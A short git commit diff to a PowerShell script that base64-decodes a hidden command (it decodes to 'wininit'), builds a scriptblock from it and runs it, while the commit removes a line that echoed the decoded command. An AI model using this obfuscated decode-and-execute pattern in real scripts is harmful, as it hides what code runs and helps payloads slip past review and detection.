2364587cbcc5992e457178a9afed17e6b15907ee
Kuno Claes <57155890+icodesdeveloper@users.noreply.github.com>
2023-11-10 12:58:02 +0100

    Update d2lu.ps1

--- d2lu.ps1
+++ d2lu.ps1
@@ -1,7 +1,3 @@
 $dbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2luaW5pdA=="))
 $dab = [scriptblock]::Create($dbs)
 Invoke-Command -ScriptBlock $dab
-echo $dbs
-
-
-#e
